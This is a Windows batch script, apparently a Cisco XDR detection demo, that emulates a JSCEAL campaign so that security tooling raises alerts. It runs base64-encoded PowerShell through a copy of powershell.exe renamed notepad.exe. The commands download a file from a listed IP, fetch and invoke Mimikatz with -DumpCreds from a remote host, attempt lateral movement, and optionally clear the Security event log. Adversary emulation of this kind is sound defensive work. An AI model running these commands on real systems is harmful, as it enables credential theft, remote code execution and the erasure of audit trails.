@echo off
cls
echo XX    XX DDDDDD   RRRRRR
echo  XX  XX  DD   DD  RR   RR
echo   XXXX   DD    DD RR   RR
echo   XXXX   DD    DD RRRRRR
echo  XX  XX  DD   DD  RR  RR
echo XX    XX DDDDDD   RR   RR
echo.
echo For details or assistance with this script, contact Darryl Hicks (darhicks@cisco.com)
echo.
echo.
echo.
echo.
Echo The following script will trigger events from the following research:
Echo https://circleid.com/posts/into-the-deep-dns-sea-with-the-jsceal-campaign
Echo.
Echo Investigation after executing this batch file will show connections to https://foo-foo.bar, 104.21.12.37 and DNS to URL: https://reg.ru (it will actually open a webpage)
Echo.
Echo.
:: Process creates a test directory, copies powershell to that directory as notepad, the attempts to connect to a malicious URL and IP, then deletes the test directory.
:: Escalates privileges without prompt (TA0002: Execution, TA0005: Evasion, T1059: Powershell)
powershell.exe Set-ExecutionPolicy Unrestricted
:: mkdir c:\test
Echo y | powershell.exe -exec bypass -enc bQBrAGQAaQByACAAYwA6AFwAdABlAHMAdAA= 
:: Creates a test directory on the local C: drive
:: copy-item -path c:\windows\system32\windowspowershell\v1.0\powershell.exe -destination c:\test\notepad.exe
copy "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\test\notepad.exe"
:: Copies powershell.exe to the newly created test directory as a notepad application
:: Start-Process https://reg.ru
c:\test\notepad.exe -e UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAcwA6AC8ALwByAGUAZwAuAHIAdQA=
:: Starts the default browser and directs it to a benign site with ties to this attack campaigndomain
:: powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://104.21.12.37/nofile.exe', 'C:\nofile.exe')"
c:\test\notepad.exe -e IgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAMAA0AC4AMgAxAC4AMQAyAC4AMwA3AC8AbgBvAGYAaQBsAGUALgBlAHgAZQAnACwAIAAnAEMAOgBcAG4AbwBmAGkAbABlAC4AZQB4AGUAJwApACIA
:: Attempts a HTTP web request to download a non-existing file from a malicious IP
:: powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://foo-foo.bar/PowerShellMafia/PowerSpolit/f650520c5b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.pls'); Invoke-Mimikatz -DumpCreds"
c:\test\notepad.exe -e IgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGYAbwBvAC0AZgBvAG8ALgBiAGEAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwATQBhAGYAaQBhAC8AUABvAHcAZQByAFMAcABvAGwAaQB0AC8AZgA2ADUAMAA1ADIAMABjADUAYgAxADAAMAA0AGQAYQBmADgAYgAzAGUAYwAwADgAMAAwADcAYQAwAGIAOQA0ADUAYgA5ADEAMgA1ADMAYQAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAGwAcwAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwAiAA==
:: Attempts to invoke mimikatz from a non-existent github repository (in order to steel credentials) 
:: Before cleanup we will add one command to make this somewhat realistic - lateral movement
:: powershell.exe -exec bypass -enc "Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock { cmd.exe /c 'whoami /all > C:\Users\Public\who.txt' } -Credential (Get-Credential)"
c:\test\notepad.exe -e IgBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAMQAyADcALgAwAC4AMAAuADEAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABjAG0AZAAuAGUAeABlACAALwBjACAAJwB3AGgAbwBhAG0AaQAgAC8AYQBsAGwAIAA+ACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAB3AGgAbwAuAHQAeAB0ACcAIAB9ACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKABHAGUAdAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAKQAiAA==
:: remove-item c:\test -Recurse -Force
powershell.exe -exec bypass -enc cgBlAG0AbwB2AGUALQBpAHQAZQBtACAAYwA6AFwAdABlAHMAdAAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBvAHIAYwBlAA==
:: removes the test directory and files that were created
echo.
echo.
set /p "userInput=Press x [& ENTER] to wipe the security event logs (for additional Impact TTP), any other key to skip this step: "
if /i not "%userInput%"=="x" exit /b
powershell.exe -exec bypass -enc QwBsAGUAYQByAC0ARQB2AGUAbgB0AEwAbwBnACAALQBMAG8AZwBOAGEAbQBlACAAUwBlAGMAdQByAGkAdAB5AAoA
:: optional Clear-EventLog -LogName Security after prompting
echo.
echo.
echo Script completed successfully. Pressing any key will close this window...
echo.
echo.
echo To demonstrate this capability, go to google and search for "DNS jsceal". Select the top result. Querry this page for observables using the Cisco XDR plug-in. Click the investigation button. XDR will show matches to this attack including each computer this batch runs on. This is an example of using an XDR to threat hunt and find a successfull hit. 
echo.
echo.
pause
Exit



